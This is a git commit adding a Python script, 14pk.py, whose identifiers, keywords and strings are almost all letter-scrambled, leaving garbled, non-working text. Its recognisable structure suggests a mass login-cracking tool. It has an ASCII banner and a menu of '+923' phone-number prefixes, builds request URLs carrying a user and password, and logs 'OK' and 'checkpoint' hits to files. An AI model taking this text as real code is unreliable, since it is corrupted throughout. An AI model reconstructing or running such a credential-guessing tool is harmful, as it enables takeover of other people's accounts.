f881d3963673ee3cfb768f66e0793f74bb59ed05
Mafia-Killer404 <72305102+Mafia-Killer404@users.noreply.github.com>
2020-11-17 15:00:39 +0500

    Create 14pk.py

---
+++ 14pk.py
@@ -0,0 +1,256 @@
+wkhzkp xg,qqd,mevs,bsexprac,jlgzxa,fsdahrp,pw,eannobayz,fbcl,mcehrp,agzdenzgt,rxpyoqk
+zl.ohgrwx('ki -at .rpe')
+yka b gf ctjps(7000):
+ 
+    lemk = njbbgx.kwwrgfe(111111111, 999999999)
+    
+    lub.grvznp = xdcf('.eqp', 'j')
+ 
+    dpaym(jvpp)
+ 
+    kjl.ocrmme.yhdgf()
+    
+lcr:
+    evdmje kazickel
+agqche BiycplPknxf:
+    mk.drocsk('hti2 ewgrswe nneswdmo')
+    
+cfw:
+    axikah kwnawwwxw
+pqyndr AxikahCjchn:
+    xg.qqdmav('dgh2 tgocojd xxyqolakx')
+    prac.kwxay(1)
+    cq.kjlpna('nqeakw2 bktc.iu')
+    
+ofme xnhcwnjzvabggfr.ikxz geahnc HfjptzYcmd
+qkkv fcifxocg.cpnxlcwmfd biycpl NhjwsalthjNfpgc
+ynxa kwnawwwxw tflxfr Tchsbsp
+ 
+ 
+jpekjr(qqd)
+lub.gcloxbjijlpgyxrgfr('npo8')
+pp = epvdjbgrp.Unxkqwc()
+un.bsr_zlgzus_pgmhpb(Tyddx)
+xa.gcl_stjmzc_jpynngf(epvdjbgrp._apcd.FLEINntpwdaLacawdlka(),ayp_ebin=1)
+pp.sowdnobwcl = [('qbsp-srxjc','Rydgbg/1.6.0 (Uwlmi; N; Wwrpgtw 4.4.2; JG55 Psaww/GXH5506) [DTLG/BK4O;DTLO/106.0.0.26.68;BKPT/45904160;XMWI/{mslktmu=3.0,fwbls=1080,aarufl=1920};QUHL/wr_AE;YXAJ/45904160;DTNK/LxgrwXhxrzc;XMFB/jgsk;QUXM/oqmd;YXYB/agx.ywlszgzd.gjhyfl;YXMJ/YKFL_V00JR;DTDO/5.0;BKCN/1;XMVW/g86:opeptxr-j7y;]')]
+vpy agp():
+	njtgp '[!] Nlgl'
+	zl.ohg.cptm()
+ 
+znt nkm(s):
+	bxf c ay s + '\j':
+		bmq.kewkdh.ujtma(n)
+		gwk.dmzxir.xwnoq()
+		hgep.lhnsn(0.03)
+ 
+vpy p():
+    cwkw.deand(1)
+bwq vx():
+    xg.qqdmav('qjwlk')
+##### Znj : Yjmtx Jzg Epfkw#####
+##### ZMYZ #####
+ekpc='''
+\033[1;91k█▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
+\033[1;93e█░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
+\033[1;92x▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
+
+\033[1;97f█░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
+\033[1;96i█▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
+\033[1;95v▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
+\l1z[1;93e--------------------------------------------------------------
+\i1u[1;92i➣  WOKW  : QTNXCO SYLWAW
+\v1t[1;91x➣  VUKSP FLFA : VODAL-DEUZCJ
+\i1u[1;93i➣  FVYLDTLY BM     : +92132197796
+\p1m[1;95f➣  SJFLAYZ  : ZXB,R ULEH VS MFWR PNLR
+\p1m[1;96f➣  BDBLQ WBJN : OEWL FA SOUSY AK TS
+\v1t[1;97x➣  GKCS     : SKP YWBH 4E KTF JNH
+\v1t[1;94x➣  WEBQJSXBWA :OUSJ YNXA GDWBCJZ USJ.
+\q1x[1;93v--------------------------------------------------------------"""
+                                '''
+
+pyuv = 0
+lqlqckdyqu = []
+qnt = []
+zdo = []
+rr = []
+bwq fawi():
+	mk.drocsk('uwxwa')
+	dpaym hxum
+	hcbjc "\033[1;92aKSQBW-TWJDPK"
+	lawll
+        akewh "\033[1;91kSEMWLY MF ATGRGRSY GACKMJVL"
+	lawll "\033[1;92x[1]  FKKWJAYD"
+	lawll "\033[1;92x[2]  MAUWLGC"
+	inrbr "\033[1;92e[3]  HTNRR"
+	njtgp "\033[1;92v[4]  IDGYX"
+	lawll "\033[1;92x[5]  SKWU"
+	njtgp "\033[1;92v[6]  INVLMA BMQLPF"
+	lawll "\033[1;92x[0]  XTRH_ISWME VOP"	    
+	hcbjc 50*'-'
+	oalthj()
+	
+msd snmexb():	
+	zus = kwf_wlhfm('\j  NBRWC AAAS YFJ GQVPCJ ')
+	ty xlv =='':
+		njtgp '[!] Owjd tg yxfpwnmhh'
+		oalthj()
+	nzgx mvd =="+1":
+		xg.qqdmav("qjwlk")
+		lawll (whcx)
+		dpaym "\033[1;91iVCZAWBJT/XYRK VKMS FWCX"		
+		lawll "\033[1;95x00, 01, 02, 03, 04,"
+		inrbr "\033[1;95e05, 06, 07, 08, 09,"
+		eku:
+			l = fyo_tgldh(" QWWXYCSB UZWA: ")
+			t="+1"
+			wbdtlp = ('.clr')
+			xzk hrbc ay hlnb(gvwboc,"f").pwlwhrbck():
+				tw.wydcfo(eews.qlcbl())
+		nlawam EXSpjzk:
+			lawll ("[!] Qbhn Bml Qhqwr")
+			psh_bjyir("\f[ Mtyt ]")
+			acff()
+	xhrt zus =="2":			
+		ho.bmqlpf("yusyj")
+		akewh (jgrh)
+		lawll "\033[1;91xMAUWLGCX YXRC ZPKA"		
+		yfgfe "\033[1;94f40, 41, 42, 43, 44,"
+		lawll "\033[1;95x45, 64, ??, ??, ??,"
+		mnh:
+			q = psh_bjyir(" KPEALHCV NHZN: ")
+			y="+923"
+			gvwboc = ('.hvl')
+			qhn uwlw tg kysl(aoeebh,"p").jptzuwlwd():
+				bz.jdnwyw(hrbc.kekey())
+		svupip RCCjchn:
+			yfgfe ("[!] Yeus Lge Ykdbb")
+			jlp_ewdsl("\y[ Uwly ]")
+			kwyn()
+	auwd tna =="3":			
+		kb.gwkexi("lzcsc")
+		inrbr (dzzk)
+		yfgfe "\033[1;91fSJFGV NHZN VCJP"		
+		inrbr "\033[1;94e20, 21, 22, 23,"
+		akewh "\033[1;95k24, ??, ??, ??,"
+		lcr:
+			y = aou_ayiqc(" GCDPVPNR AGOX: ")
+			g="+923"
+			rrjadm = ('.pgh')
+			dgc eews gf ziaw(wbdtlp,"a").fcsoeewsq():
+				ao.tlyslv(wbjn.grjti())
+		agqche BKNfpgc:
+			inrbr ("[!] Xtea Wcr Xznjm")
+			fyo_tgldh("\l[ Tlvg ]")
+			vslm()	
+	peeo paz =="4":			
+		zl.ohgrwx("vhnop")
+		hcbjc (zmyz)
+		inrbr "\033[1;91eFYKWS AGOX DNFC"		
+		hcbjc "\033[1;94a31, 32, 33, 34,"
+		njtgp "\033[1;95v35, 36, 37, ??,"
+		hpq:
+			n = kwf_wlhfm(" ONZCUEXZ LCBW: ")
+			v="+923"
+			bzuwql = ('.eqp')
+			ocp dtga rb mhpg(emzgke,"k").nnobdtgab():
+				wb.saiawr(jayx.ocfgh())
+		pqyndr AZXnacp:
+			hcbjc ("[!] Tgdp Gkc Tmmyw")
+			njk_gfanp("\w[ Pyuv ]")
+			fawi()	
+	cdty xlv =="5":			
+		mk.drocsk("uwxwa")
+		dpaym (hxum)
+		hcbjc "\033[1;91aXGYZ YXRC ZPKA"		
+		yfgfe "\033[1;94f10, 11, 12, 13,"
+		lawll "\033[1;95x14, 15, 16, 17,"
+		mnh:
+			q = psh_bjyir(" KPEALHCV NHZN: ")
+			y="+923"
+			gvwboc = ('.hvl')
+			qhn uwlw tg kysl(aoeebh,"p").jptzuwlwd():
+				bz.jdnwyw(hrbc.kekey())
+		svupip RCCjchn:
+			yfgfe ("[!] Yeus Lge Ykdbb")
+			jlp_ewdsl("\y[ Uwly ]")
+			kwyn()
+	auwd tna =="6":
+	    kb.gwkexi("lzcsc")
+	    ho.bmqlpf("lrd2 gfdmwuz --shrkwms zswej")
+	    xg.qqdmav("dgh2 tgocojd --ficaobw mthub")
+	    mk.drocsk("uwxwa")
+	    dpaym(hxum)
+	    hcbjc
+	    dqt (" Ehku vyk mxaw gsunxobtsdwr qyrylpw")
+	    prac.kwxay(2)
+	    cq.kjlpna("nqeakw2 .FCSOFA.vr")
+#	cdty yqp =='3':	
+#	    mk.drocsk('poz-kysl zemlb://kuo.qtynpmgv.vkv/100002059014174/dmkel/2677733205638620/?odpqlzku_rbbwi=0&tly=tzd')
+#	    ebin.gjwpi(1)
+#	    inbs()
+	wwbb kqf =='0':
+		wiu()
+	augc:
+		hcbjc '[!] Tgdw bj lcpjpvpum'
+		yuebkw()
+ 
+	lvp = dmn(usl(ao))
+	iok ('[✓] Hmlle Jdazwcl: '+tgl)
+	raxx.ousch(0.5)
+	alx ('[✓] Yzcsdx sjwr, hchyngq ad kqwbgfr ...')
+	mevs.qdpxl(0.5)
+	ygz ('[✓] Dllp 9 mweael ora lmxuaa qjgyx ...')
+	prac.kwxay(0.5)
+	dqt ('[!] Vthcw Kscga Ts jqp(Mk Nlgl) Akabg ALCE Pqsl Hcxob n')
+	raxx.ousch(0.5)
+	akewh 50*'-'
+	njtgp
+	
+			
+	msd elbj(jfe):
+		ywhxjz ahm,hgb
+		iqwc = tnp
+		hpq:
+			zl.itrgj('dtrn')
+		svupip XGCjchn:
+			yoqk
+		eku:
+			yoqk1 = flaa
+			ryll = un.xdcf('smpyg://z-sab.bjqctzhg.lck/epmdxr/ymea.hxugf?lvyngq_lzdaw=237759909591655%25257Q0d140sluamtz65sn27t739am1o2263z1&xzkijh=hkzg&omy_twclexb=1&celbh=' +t+q+skpk+ '&hxqydp=xj_DG&nsdlsxfb=' + hllo1 + '&bri=azl&cnbcjlma_bsqkthj_lcmctxo=1&bwe=3x555q98yx61oqb7sl0v44b58o522sde')
+			b = coxb.jglw(zjhy)
+			aq 'tylsqk_ehgnb' gf b:
+				inrbr '\p1m[1;91fIJTGS-VBHUSP-ZLVGNR\v1t[1;97x-\q1x[1;94v✙\l1z[1;96e-' + v + v + qbsp + '-\p1m[1;93f✙\t1k[1;95a-' + nsdl1																				
+				ktp = mhpg('ojjc/kfvyngqxfeh.clr', 's')
+				zdx.ffglp(d+y+dgcj+'|'+atob1+'\b')
+				mcm.vhxgc()
+				gvl.wydcfo(v+qbsp+hllo1)
+			nzqw:
+				ty 'sfk.dsnxxxci.uzf' ew e['cjchn_vge']:
+					hcbjc '\l1z[1;92eLYPNF(3BSJL)🗝\t1k[1;95a-\v1t[1;93x✙\q1x[1;96v-' + y + a + mdxn + '-\g1p[1;93k✙\p1m[1;95f-' + ljgq1
+					ual = kysl('kloa/lvcuvikrbr.lim', 'w')
+					ldq.ocbpn(y+a+mdxn+'|'+yoqk1+'\y')
+					vlb.qjgdx()
+					yyp.yhaxjm(q+skpk+ljgq1)
+				
+								
+							
+		wivayh:
+			nsdl
+		
+	l = CvpwlwLxcj(30)
+	h.xtl(vogf, tw)
+	lawll 50*'-'
+	akewh '[✓] Njzvabg Fsd Uanb Agxihnhcv ....'
+	akewh '[✓] Rgeth XY/AH : '+dmn(usl(gvl))+'/'+ocf(jwy(vlk))
+	dpaym('[✓] YY Tgdp Awb Pcwy Lwesb : kloa/lvcuvikrbr.lim')
+	njk_gfanp('\w[Dpwdl Awhcj Eh Cx Pyuv]')
+	ho.bmqlpf('lhhfgy2 .KAJRKW.xw')
+		
+eo __byep__ == '__fwrb__':
+	kwyn()
+
+
+
+
+
+
